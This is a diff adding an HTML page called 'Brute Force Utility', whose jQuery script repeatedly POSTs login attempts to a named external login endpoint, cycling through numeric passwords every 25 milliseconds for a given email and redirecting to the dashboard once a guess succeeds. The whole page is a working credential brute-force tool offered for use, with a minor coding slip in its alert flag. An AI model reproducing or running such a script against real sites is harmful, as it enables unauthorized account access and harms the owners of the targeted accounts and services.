@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Brute Force Utility</title>
+    </head>
+    <body>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <input type="text" id="user" value="email@example.com">
+        <button id="click">Brute Force It</button>
+        <p id="log"></p>
+        <script>
+            var alerted = false;
+        
+            $(function(){
+                $("#click").click(function(){
+                    var user = $("#user").val();
+                    var guess = 1;
+                    
+                    interval = setInterval(function() {
+                        console.log("Trying " + user + ", " + guess);
+                        $.ajax("https://senmo.solidsecurity.co/login.php", {
+                            method: "POST",
+                            data: {
+                                "email": user,
+                                "password": guess,
+                                "login": true
+                            },
+                            success: function(data) {
+                                if(data.includes("Dashboard")) {
+                                    if(!alerted) {
+                                        alert("Success! Found the password. Logging in now.");
+                                        alert = true;
+                                    }
+                                    window.location = 'dashboard.php';
+                                    clearInterval(interval);
+                                }
+                            }
+                        });
+                        guess++;
+                    }, 25);
+                });
+            });
+        </script>
+    </body>
+</html>
